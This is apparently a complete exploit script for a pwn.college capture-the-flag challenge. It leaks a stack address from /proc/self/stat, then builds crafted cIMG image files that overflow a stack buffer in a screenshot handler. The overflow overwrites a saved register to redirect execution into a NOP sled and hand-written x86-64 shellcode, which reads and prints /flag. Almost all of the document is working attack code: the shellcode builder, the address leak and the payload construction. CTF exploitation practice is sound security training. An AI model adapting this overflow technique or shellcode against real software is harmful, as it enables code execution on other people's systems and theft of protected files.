#!/usr/bin/env python3
"""
PwnCollege - CIMG Screenshots Exploit (FINAL)
==============================================
Challenge: integration-cimg-screenshot-sc
Vulnerability: Stack buffer overflow in handle_1337 (screenshot handler)
Technique: Overwrite saved rbx → hijack notrack jmp dispatch → shellcode

Key findings:
  - Rotation: screenshot[N] = file[(N+253)%255] = file[N-2] for N>=2
  - Saved rbx at file offset 134 (empirical, due to rotation)
  - Directive 7 reads *(rbx+20), so jump offset at file[18] → screenshot[20]
  - Shellcode at file[22] → screenshot[24], jump_target = 24
  - Stack offset: buffer = startstack - 0x11d0
  - MUST zero eax before mov al, N for syscalls (upper bits of rax have garbage)
"""
import struct, subprocess, re, os, sys

FNAME = "/tmp/exploit.cimg"
SC_FILE = "/tmp/sc.bin"
BIN = "/challenge/integration-cimg-screenshot-sc"
STACK_OFFSET = -0x11d0

if not os.path.exists(BIN):
    BIN = "./integration-cimg-screenshot-sc.patched"


def hdr(n):
    return struct.pack("<4sHBBi", b"cIMG", 4, 255, 1, n)


def d_load(sid, path):
    d = struct.pack("<H", 5) + struct.pack("BBB", sid, 255, 1)
    return d + path.encode().ljust(255, b"\x00")


def d_render(sid):
    return struct.pack("<H", 4) + struct.pack(
        "BBBBBBBBB", sid, 0, 0, 0, 0, 0, 255, 1, 0xAA
    )


def d_screenshot(sid, w=144):
    return struct.pack("<H", 1337) + struct.pack("BBBBB", sid, 0, 0, w, 1)


def d_show():
    return struct.pack("<H", 6) + b"\x00"


# ─── Shellcode ────────────────────────────────────────────


def make_cat_shellcode(path=b"/flag"):
    """open(path); read(fd, stack, 0x400); write(1, stack, n); exit(0)"""
    sc = b""

    # Push path to stack (null-terminated, 8-byte aligned)
    p = path + b"\x00"
    while len(p) % 8:
        p += b"\x00"
    for i in range(len(p) - 8, -8, -8):
        chunk = p[i:i + 8]
        qw = struct.unpack("<Q", chunk)[0]
        if qw == 0:
            sc += b"\x48\x31\xc0\x50"  # xor rax,rax; push rax
        else:
            sc += b"\x48\xb8" + struct.pack("<Q", qw) + b"\x50"  # mov rax,imm; push

    # open(path, O_RDONLY, 0)
    sc += b"\x48\x89\xe7"  # mov rdi, rsp
    sc += b"\x48\x31\xf6"  # xor rsi, rsi
    sc += b"\x48\x31\xd2"  # xor rdx, rdx
    sc += b"\x31\xc0\xb0\x02\x0f\x05"  # xor eax,eax; mov al,2; syscall

    # read(fd, stack_buf, 0x400)
    sc += b"\x48\x89\xc7"  # mov rdi, rax
    sc += b"\x48\x81\xec\x00\x04\x00\x00"  # sub rsp, 0x400
    sc += b"\x48\x89\xe6"  # mov rsi, rsp
    sc += b"\xba\x00\x04\x00\x00"  # mov edx, 0x400
    sc += b"\x31\xc0\x0f\x05"  # xor eax,eax; syscall (read)

    # write(1, stack_buf, n)
    sc += b"\x48\x89\xc2"  # mov rdx, rax
    sc += b"\xbf\x01\x00\x00\x00"  # mov edi, 1
    sc += b"\x48\x89\xe6"  # mov rsi, rsp
    sc += b"\xb8\x01\x00\x00\x00\x0f\x05"  # mov eax,1; syscall

    # exit(0)
    sc += b"\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05"
    return sc


# ─── Exploit ──────────────────────────────────────────────


def leak_startstack():
    """Leak startstack via /proc/self/stat (ASLR disabled by binary)."""
    payload = hdr(3) + d_load(0, "/proc/self/stat") + d_render(0) + d_show()
    with open(FNAME, "wb") as f:
        f.write(payload)
    proc = subprocess.run([BIN, FNAME], capture_output=True, timeout=15)
    chars = []
    for m in re.finditer(rb'm(.)\x1b\[0m', proc.stdout):
        chars.append(m.group(1))
    text = b"".join(chars).decode("latin-1")
    fields = text.split()
    if len(fields) < 28:
        print("[-] Failed to parse startstack")
        sys.exit(1)
    ss = int(fields[27])
    print(f"[+] startstack = {hex(ss)}")
    return ss


def build_exploit(startstack):
    buf_addr = startstack + STACK_OFFSET
    print(f"[+] buffer      = {hex(buf_addr)}")

    sc = make_cat_shellcode(b"/flag")
    print(f"[+] shellcode   = {len(sc)} bytes")

    # Build file payload (255 bytes)
    # Rotation: screenshot[N] = file[N-2] (mod 255)
    # Directive 7 reads *(rbx+20) = screenshot[20..23] = file[18..21]
    # Shellcode at file[22] → screenshot[24]
    # Saved rbx at file[134]
    payload = bytearray(255)
    for i in range(255):
        payload[i] = 0x90  # NOP sled

    jump_off = 24
    struct.pack_into("<i", payload, 18, jump_off)

    sc_start = 22
    if sc_start + len(sc) > 134:
        print(f"[-] Shellcode too long: {len(sc)} > {134 - sc_start}")
        sys.exit(1)
    payload[sc_start:sc_start + len(sc)] = sc

    struct.pack_into("<Q", payload, 134, buf_addr)

    with open(SC_FILE, "wb") as f:
        f.write(payload)
    print(f"[+] sc.bin      = {SC_FILE} ({len(payload)} bytes)")

    # Build CIMG: load sprite, render, screenshot (overflow), sleep (trigger jump)
    exp = bytearray()
    exp += hdr(4)
    exp += d_load(0, SC_FILE)
    exp += d_render(0)
    exp += d_screenshot(0, w=144)
    exp += struct.pack("<H", 7) + struct.pack("<i", 100)
    with open(FNAME, "wb") as f:
        f.write(exp)
    print(f"[+] exploit     = {FNAME}")


def run():
    print("[*] Running exploit...", flush=True)
    proc = subprocess.run([BIN, FNAME], capture_output=True, timeout=15)

    flag = re.search(rb'pwn\.college\{[^}]+\}', proc.stdout)
    if flag:
        print(f"\n{'='*55}")
        print(f"[+] FLAG: {flag.group().decode()}")
        print(f"{'='*55}")
        return True

    clean = re.sub(rb'\x1b\[[0-9;]*m', b'', proc.stdout)
    if clean.strip():
        print(f"[*] Output: {clean[:500]}")
    print(f"[*] Exit: {proc.returncode}")
    return False


def main():
    print(f"[*] Binary: {BIN}")
    print()
    ss = leak_startstack()
    build_exploit(ss)
    print()
    run()


if __name__ == "__main__":
    main()
